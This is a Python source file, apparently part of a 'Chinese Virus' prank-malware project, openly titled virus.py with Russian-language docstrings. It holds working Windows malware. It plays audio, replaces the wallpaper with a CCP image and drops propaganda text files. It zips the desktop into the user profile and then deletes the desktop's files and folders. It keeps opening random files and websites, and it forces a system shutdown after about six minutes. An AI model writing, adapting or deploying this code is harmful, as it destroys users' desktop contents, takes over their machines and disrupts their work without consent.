# virus.py

import os
import shutil
import ctypes
import time
import random
import webbrowser
from pathlib import Path

try:
    from config import PATH_TO_DATA, PATH_TO_MAIN, PATH_TO_IMAGES, PATH_TO_TEXT, PATH_TO_DESKTOP
except:
    try:
        from .config import PATH_TO_DATA, PATH_TO_MAIN, PATH_TO_IMAGES, PATH_TO_TEXT, PATH_TO_DESKTOP
    except:
        from Chinese_Virus_Core.config import PATH_TO_DATA, PATH_TO_MAIN, PATH_TO_IMAGES, PATH_TO_TEXT, PATH_TO_DESKTOP

def start_audio() -> None:
    '''Процедура запускает фоновую музыку'''

    shutil.copyfile(PATH_TO_MAIN / 'audio.mp3', PATH_TO_DESKTOP / 'audio.mp3')
    os.startfile(PATH_TO_DESKTOP / 'audio.mp3')

def change_wallpaper() -> None:
    '''Процедура меняет обои рабочего стола'''

    shutil.copyfile(PATH_TO_MAIN / 'CCP_Wallpaper.jpg', PATH_TO_DESKTOP / 'CCP_Wallpaper.jpg')
    wallpaper_path = str(PATH_TO_MAIN / 'CCP_Wallpaper.jpg')
    ctypes.windll.user32.SystemParametersInfoW(20, 0, wallpaper_path, 0)

def start_main_text() -> None:
    '''Процедура создает основные текстовые файлы'''

    for text_file_name in os.listdir(PATH_TO_MAIN):
        if text_file_name.endswith('.txt'):
            shutil.copyfile(PATH_TO_MAIN / text_file_name, PATH_TO_DESKTOP / text_file_name)
            if text_file_name in ['Message_from_Chinese_Communist_Party_EN.txt', 'Message_from_Chinese_Communist_Party_CH.txt']:
                os.startfile(PATH_TO_DESKTOP / text_file_name)

def zip_desktop_files() -> None:
    '''Процедура создает архив с файлами рабочего стола'''

    archive_path = Path(os.environ['USERPROFILE']) / 'CCP_desktop_files'
    shutil.make_archive(archive_path, 'zip', PATH_TO_DESKTOP)

    for file_name in os.listdir(PATH_TO_DESKTOP):
        if file_name not in ['desktop.ini', 'CCP_desktop_files.zip', *os.listdir(PATH_TO_MAIN)]:
            try:
                os.remove(PATH_TO_DESKTOP / file_name)
            except IsADirectoryError:
                shutil.rmtree(path=PATH_TO_DESKTOP / file_name, ignore_errors=True)
            except PermissionError:
                pass

def start_file(path: str) -> None:
    '''Процедура создает случайный файл
    :param path: Изначальный путь к файлу'''

    file_name = random.choice(os.listdir(path))
    shutil.copyfile(path / file_name, PATH_TO_DESKTOP / file_name)
    os.startfile(PATH_TO_DESKTOP / file_name)

def start_website() -> None:
    '''Процедура открывает случайный вебсайт'''

    with open(file=(PATH_TO_DATA / 'websites.txt'), mode='r', encoding='utf-8') as file:
        websites = file.read().splitlines()
    website = random.choice(websites)
    webbrowser.open(website)

def start_virus() -> None:
    '''Процедура запускает вирус'''

    start_audio()
    start_audio_time = time.time()
    change_wallpaper()
    time.sleep(1)
    start_main_text()
    time.sleep(15)
    zip_desktop_files()
    time.sleep(30)

    while True:
        if (time.time() - start_audio_time) > 374:
            os.system('shutdown /s /t 10')
        
        random_choice = random.randint(1, 3)
        match random_choice:
            case 1:
                start_file(PATH_TO_TEXT)
            case 2:
                start_file(PATH_TO_IMAGES)
            case 3:
                start_website()
        
        time.sleep(random.randint(5, 10))


__all__ = ['start_virus']